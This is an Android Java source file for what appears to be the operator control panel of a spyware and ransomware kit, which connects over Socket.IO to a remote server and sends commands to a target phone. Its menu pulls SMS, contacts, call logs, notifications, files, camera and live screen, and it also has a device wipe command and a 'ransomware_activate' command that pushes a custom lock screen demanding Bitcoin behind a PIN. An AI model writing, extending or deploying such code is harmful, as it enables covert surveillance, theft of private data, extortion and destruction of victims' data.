package com.testapp;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.Dialog;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Bundle;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;
import android.view.animation.AlphaAnimation;
import android.view.animation.ScaleAnimation;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.*;
import io.socket.client.IO;
import io.socket.client.Socket;
import org.json.JSONObject;
import java.net.URISyntaxException;

public class ControlActivity extends Activity {
    private Socket socket;
    private String deviceId;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        deviceId = getIntent().getStringExtra("deviceId");
        String model = getIntent().getStringExtra("deviceModel");
        String battery = getIntent().getStringExtra("battery");

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(0xFF090909);
        setContentView(root);

        // Header
        LinearLayout header = new LinearLayout(this);
        header.setOrientation(LinearLayout.HORIZONTAL);
        header.setGravity(Gravity.CENTER_VERTICAL);
        header.setBackgroundColor(0xFF171717);
        header.setPadding(16, 12, 16, 12);

        Button backBtn = new Button(this);
        backBtn.setText("←");
        backBtn.setTextColor(0xFFFFFFFF);
        backBtn.setBackgroundColor(0x00000000);
        backBtn.setOnClickListener(v -> finish());
        header.addView(backBtn);

        TextView info = new TextView(this);
        info.setText(model + " | Bat: " + battery + "%");
        info.setTextColor(0xFFFFFFFF);
        info.setPadding(12, 6, 12, 6);
        info.setBackgroundColor(0xFF171717);
        LinearLayout.LayoutParams infoParams = new LinearLayout.LayoutParams(
                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
        info.setLayoutParams(infoParams);
        info.setGravity(Gravity.CENTER);
        header.addView(info);

        TextView notif = new TextView(this);
        notif.setText("2");
        notif.setTextColor(0xFFFFFFFF);
        notif.setBackground(getDrawable(R.drawable.btn_admin));
        notif.setPadding(10, 4, 10, 4);
        header.addView(notif);
        root.addView(header);

        // Panel Lock/Unlock
        LinearLayout lockPanel = new LinearLayout(this);
        lockPanel.setOrientation(LinearLayout.HORIZONTAL);
        lockPanel.setGravity(Gravity.CENTER);
        lockPanel.setPadding(16, 16, 16, 0);

        Button lockScreenBtn = new Button(this);
        lockScreenBtn.setText("🔒 Lock Screen");
        lockScreenBtn.setTextColor(0xFFFFFFFF);
        lockScreenBtn.setBackgroundColor(0xFFFF1744);
        lockScreenBtn.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams lockBtnParams = new LinearLayout.LayoutParams(0, 72, 1);
        lockBtnParams.setMargins(6, 0, 6, 0);
        lockScreenBtn.setLayoutParams(lockBtnParams);
        lockScreenBtn.setOnClickListener(v -> showLockScreenDialog());
        lockPanel.addView(lockScreenBtn);

        Button unlockBtn = new Button(this);
        unlockBtn.setText("🔓 Unlock");
        unlockBtn.setTextColor(0xFFFFFFFF);
        unlockBtn.setBackgroundColor(0xFF00E676);
        unlockBtn.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams unlockBtnParams = new LinearLayout.LayoutParams(0, 72, 1);
        unlockBtnParams.setMargins(6, 0, 6, 0);
        unlockBtn.setLayoutParams(unlockBtnParams);
        unlockBtn.setOnClickListener(v -> sendCmd("unlock"));
        lockPanel.addView(unlockBtn);
        root.addView(lockPanel);

        // Grid Menu 2 kolom
        ScrollView scroll = new ScrollView(this);
        LinearLayout grid = new LinearLayout(this);
        grid.setOrientation(LinearLayout.VERTICAL);
        grid.setPadding(16, 12, 16, 12);

        String[][] items = {
            {"📷", "Kamera", "#FF1744", "start_camera"},
            {"💬", "SMS", "#FF4D8D", "get_sms"},
            {"👥", "Kontak", "#00E676", "get_contacts"},
            {"📞", "Panggilan", "#FFC107", "get_calls"},
            {"🖥️", "Live Screen", "#2ED8FF", "live_screen"},
            {"📦", "Aplikasi", "#2196F3", "get_apps"},
            {"🌐", "Jaringan", "#9C27B0", "get_network"},
            {"🔔", "Notifikasi", "#FF9800", "get_notifications"},
            {"📶", "WiFi Scan", "#00BCD4", "wifiscan"},
            {"📁", "File Mgr", "#FF5722", "list_files"},
            {"📡", "Cell Tower", "#607D8B", "celltower"},
            {"🕒", "WiFi Hist", "#3F51B5", "wifihistory"}
        };

        LinearLayout row = null;
        for (int i = 0; i < items.length; i++) {
            if (i % 2 == 0) {
                row = new LinearLayout(this);
                row.setOrientation(LinearLayout.HORIZONTAL);
                grid.addView(row);
            }
            row.addView(createMenuCard(items[i]));
        }
        scroll.addView(grid);
        root.addView(scroll);

        // Control Center
        TextView controlCenter = new TextView(this);
        controlCenter.setText("🎛️ Control Center");
        controlCenter.setTextColor(0xFFFFFFFF);
        controlCenter.setBackground(getDrawable(R.drawable.card_admin));
        controlCenter.setPadding(16, 12, 16, 12);
        controlCenter.setGravity(Gravity.CENTER);
        controlCenter.setOnClickListener(v -> showControlPopup());
        root.addView(controlCenter);

        try {
            socket = IO.socket("https://ghostspy.bruang.biz.id");
            socket.connect();
        } catch (URISyntaxException e) {}
    }

    private void showLockScreenDialog() {
        Dialog dialog = new Dialog(this, android.R.style.Theme_Black_NoTitleBar_Fullscreen);
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        dialog.getWindow().setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE);

        LinearLayout container = new LinearLayout(this);
        container.setOrientation(LinearLayout.VERTICAL);
        container.setBackground(getDrawable(R.drawable.card_admin));
        container.setPadding(24, 24, 24, 24);
        int margin = 32;
        LinearLayout.LayoutParams rootParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        rootParams.setMargins(margin, margin*2, margin, margin*2);
        container.setLayoutParams(rootParams);

        TextView title = new TextView(this);
        title.setText("🔒 Custom Lock Screen");
        title.setTextColor(0xFFFFFFFF);
        title.setTextSize(20);
        title.setTypeface(null, android.graphics.Typeface.BOLD);
        title.setPadding(0, 0, 0, 16);
        container.addView(title);

        TextView htmlLabel = new TextView(this);
        htmlLabel.setText("HTML Code:");
        htmlLabel.setTextColor(0xFF9AA3B2);
        htmlLabel.setTextSize(12);
        container.addView(htmlLabel);

        EditText htmlEditor = new EditText(this);
        htmlEditor.setHint("<h1>HP TERKUNCI</h1><p>Bayar 1 BTC</p>");
        htmlEditor.setTextColor(0xFFFFFFFF);
        htmlEditor.setBackgroundColor(0xFF252525);
        htmlEditor.setPadding(16, 12, 16, 12);
        htmlEditor.setMinLines(5);
        htmlEditor.setGravity(Gravity.TOP);
        container.addView(htmlEditor);

        TextView previewLabel = new TextView(this);
        previewLabel.setText("Preview:");
        previewLabel.setTextColor(0xFF9AA3B2);
        previewLabel.setTextSize(12);
        previewLabel.setPadding(0, 12, 0, 4);
        container.addView(previewLabel);

        WebView preview = new WebView(this);
        preview.setWebViewClient(new WebViewClient());
        preview.getSettings().setJavaScriptEnabled(false);
        preview.setBackgroundColor(0xFF000000);
        LinearLayout.LayoutParams webParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 220);
        preview.setLayoutParams(webParams);
        container.addView(preview);

        htmlEditor.addTextChangedListener(new android.text.TextWatcher() {
            @Override public void beforeTextChanged(CharSequence s, int start, int count, int after) {}
            @Override public void onTextChanged(CharSequence s, int start, int before, int count) {}
            @Override public void afterTextChanged(android.text.Editable s) {
                preview.loadDataWithBaseURL(null, s.toString(), "text/html", "UTF-8", null);
            }
        });

        TextView pinLabel = new TextView(this);
        pinLabel.setText("PIN (4-6 digit):");
        pinLabel.setTextColor(0xFF9AA3B2);
        pinLabel.setTextSize(12);
        pinLabel.setPadding(0, 12, 0, 4);
        container.addView(pinLabel);

        EditText pinInput = new EditText(this);
        pinInput.setHint("1234");
        pinInput.setTextColor(0xFFFFFFFF);
        pinInput.setBackgroundColor(0xFF252525);
        pinInput.setPadding(16, 12, 16, 12);
        pinInput.setInputType(android.text.InputType.TYPE_CLASS_NUMBER | android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD);
        container.addView(pinInput);

        LinearLayout btnRow = new LinearLayout(this);
        btnRow.setOrientation(LinearLayout.HORIZONTAL);
        btnRow.setGravity(Gravity.CENTER);
        btnRow.setPadding(0, 16, 0, 0);

        Button jalankanBtn = new Button(this);
        jalankanBtn.setText("🔒 Jalankan");
        jalankanBtn.setTextColor(0xFFFFFFFF);
        jalankanBtn.setBackgroundColor(0xFF00E676);
        jalankanBtn.setOnClickListener(v -> {
            String html = htmlEditor.getText().toString().trim();
            String pin = pinInput.getText().toString().trim();
            if (html.isEmpty() || pin.isEmpty()) {
                Toast.makeText(this, "HTML & PIN harus diisi", Toast.LENGTH_SHORT).show();
                return;
            }
            sendCmd("ransomware_activate", new JSONObject() {{
                try { put("html", html); put("pin", pin); } catch (Exception e) {}
            }});
            dialog.dismiss();
        });
        btnRow.addView(jalankanBtn);

        Button matikanBtn = new Button(this);
        matikanBtn.setText("🔓 Matikan");
        matikanBtn.setTextColor(0xFFFFFFFF);
        matikanBtn.setBackgroundColor(0xFFFF1744);
        matikanBtn.setOnClickListener(v -> {
            sendCmd("ransomware_deactivate");
            dialog.dismiss();
        });
        btnRow.addView(matikanBtn);

        container.addView(btnRow);

        Button tutupBtn = new Button(this);
        tutupBtn.setText("Tutup");
        tutupBtn.setTextColor(0xFF9AA3B2);
        tutupBtn.setBackgroundColor(0x00000000);
        tutupBtn.setOnClickListener(v -> dialog.dismiss());
        container.addView(tutupBtn);

        dialog.setContentView(container);
        dialog.show();

        AlphaAnimation fadeIn = new AlphaAnimation(0f, 1f);
        fadeIn.setDuration(300);
        container.startAnimation(fadeIn);
    }

    private LinearLayout createMenuCard(String[] item) {
        LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setGravity(Gravity.CENTER);
        card.setBackgroundColor((int) Long.parseLong(item[2].substring(1), 16) | 0x22000000);
        card.setPadding(8, 20, 8, 20);
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(0, 150, 1);
        params.setMargins(6, 6, 6, 6);
        card.setLayoutParams(params);

        TextView icon = new TextView(this);
        icon.setText(item[0]);
        icon.setTextSize(28);
        icon.setGravity(Gravity.CENTER);

        TextView label = new TextView(this);
        label.setText(item[1]);
        label.setTextColor(0xFFFFFFFF);
        label.setTextSize(12);
        label.setGravity(Gravity.CENTER);
        label.setPadding(0, 8, 0, 0);

        card.addView(icon);
        card.addView(label);

        card.setOnClickListener(v -> {
            ScaleAnimation scale = new ScaleAnimation(1f, 0.9f, 1f, 0.9f,
                    android.view.animation.Animation.RELATIVE_TO_SELF, 0.5f,
                    android.view.animation.Animation.RELATIVE_TO_SELF, 0.5f);
            scale.setDuration(150);
            scale.setRepeatCount(0);
            v.startAnimation(scale);
            handleAction(item[3]);
        });

        return card;
    }

    private void handleAction(String cmd) {
        Intent i = null;
        switch (cmd) {
            case "start_camera": i = new Intent(this, CameraActivity.class); break;
            case "live_screen": i = new Intent(this, LiveScreenActivity.class); break;
            case "get_sms": i = new Intent(this, SmsActivity.class); break;
            case "get_contacts": i = new Intent(this, ContactsActivity.class); break;
            case "get_calls": i = new Intent(this, CallActivity.class); break;
        }
        if (i != null) {
            i.putExtra("deviceId", deviceId);
            startActivity(i);
        } else {
            sendCmd(cmd);
        }
    }

    private void showControlPopup() {
        AlertDialog.Builder b = new AlertDialog.Builder(this);
        b.setTitle("🎛️ Control Center");
        LinearLayout lay = new LinearLayout(this);
        lay.setOrientation(LinearLayout.VERTICAL);
        String[] cmds = {"flashlight", "vibrate", "lock", "unlock", "toast", "openurl", "wipe"};
        for (String cmd : cmds) {
            Button btn = new Button(this);
            btn.setText(cmd);
            btn.setTextColor(0xFFFFFFFF);
            btn.setBackgroundColor(0xFF171717);
            btn.setOnClickListener(v -> sendCmd(cmd));
            lay.addView(btn);
        }
        b.setView(lay);
        b.setNegativeButton("Tutup", null);
        b.show();
    }

    private void sendCmd(String cmd) {
        sendCmd(cmd, new JSONObject());
    }

    private void sendCmd(String cmd, JSONObject params) {
        if (socket != null && socket.connected()) {
            JSONObject msg = new JSONObject();
            try {
                msg.put("device_id", deviceId);
                msg.put("command", cmd);
                msg.put("params", params);
                socket.emit("command", msg);
                Toast.makeText(this, "✅ " + cmd, Toast.LENGTH_SHORT).show();
            } catch (Exception e) {}
        } else {
            Toast.makeText(this, "❌ Offline", Toast.LENGTH_SHORT).show();
        }
    }
}
